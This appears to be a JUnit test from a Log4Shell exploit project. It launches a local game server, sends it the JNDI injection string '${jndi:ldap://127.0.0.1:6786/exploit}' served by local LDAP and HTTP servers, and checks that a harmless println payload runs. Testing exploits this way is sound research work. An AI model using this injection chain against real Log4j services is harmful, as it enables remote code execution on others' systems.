package fr.thesmyler.log4shell;

import org.junit.jupiter.api.*;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

import static fr.thesmyler.log4shell.TestUtil.getJavaExecutable;
import static org.junit.jupiter.api.Assertions.assertTrue;

@TestInstance(TestInstance.Lifecycle.PER_CLASS)
public class TestRCE {

    private Process process;
    private HttpJndiServer http;
    private LdapJndiServer ldap;

    @BeforeEach
    @Timeout(value = 10)
    public void setupChildProcess() throws Exception {
        if (this.process != null) throw new IllegalStateException("Process already exists ??");
        String java = getJavaExecutable().toString();
        ProcessBuilder builder = new ProcessBuilder()
                .command(java, "-jar", "game.jar")
                .directory(new File("run"));
        this.process = builder.start();
        Scanner sc = new Scanner(this.process.getInputStream());
        String line;
        for (line = sc.nextLine(); !line.contains("username"); line = sc.nextLine()) {
            System.out.println(line);
        }
        System.out.println(line);
        this.process.getOutputStream().write("TestUser\n".getBytes(StandardCharsets.UTF_8));
        this.process.getOutputStream().flush();
        for (line = sc.nextLine(); !line.contains("Game server started on"); line = sc.nextLine()) {
            System.out.println(line);
        }
        System.out.println(line);
    }

    @BeforeAll
    @Timeout(10)
    public void startServers() throws Exception {
        this.http = HttpJndiServer.instance();
        this.http.addConnector("127.0.0.1", 6785);
        this.ldap = new LdapJndiServer("127.0.0.1", 6786, this.http.getUrl());
        this.http.start();
        this.ldap.start();
    }

    @Test
    @Timeout(5)
    public void canRegisterAndCallCommand() throws Exception {
        this.http.setDefaultPayload(PrintlnCommandExploit.class);
        this.process.getOutputStream().write("${jndi:ldap://127.0.0.1:6786/exploit}\n".getBytes(StandardCharsets.UTF_8));
        this.process.getOutputStream().flush();
        Thread.sleep(100);
        this.process.getOutputStream().write("/log4shell\n".getBytes(StandardCharsets.UTF_8));
        this.process.getOutputStream().flush();
        Scanner sc = new Scanner(this.process.getInputStream());
        String line;
        int i = 0;
        for (line = sc.nextLine(); !line.contains("Hello from log4shell :)"); line = sc.nextLine()) {
            System.out.println(line);
            assertTrue(i++ < 10, "Did not find payload source after ");
        }
    }

    @AfterEach
    @Timeout(value = 10)
    public void terminateChildProcess() throws IOException, InterruptedException {
        if (this.process == null) throw new IllegalStateException("Process does not exist ??");
        this.process.getOutputStream().write("/stop\n".getBytes(StandardCharsets.UTF_8));
        this.process.getOutputStream().flush();
        this.process.waitFor();
        this.process.destroy();
        this.process = null;
    }

    @AfterAll
    @Timeout(value = 10)
    public void terminateHttp() throws Exception {
        if (this.http == null) throw new IllegalStateException("Http server not found ??");
        this.http.stop();
    }

    @AfterAll
    @Timeout(value = 10)
    public void terminateLdap() {
        this.ldap.stop();
    }

    @AfterAll
    public void killChildProcess() {
        if (this.process != null) {
            this.process.destroyForcibly();
            this.process = null;
        }
    }

}
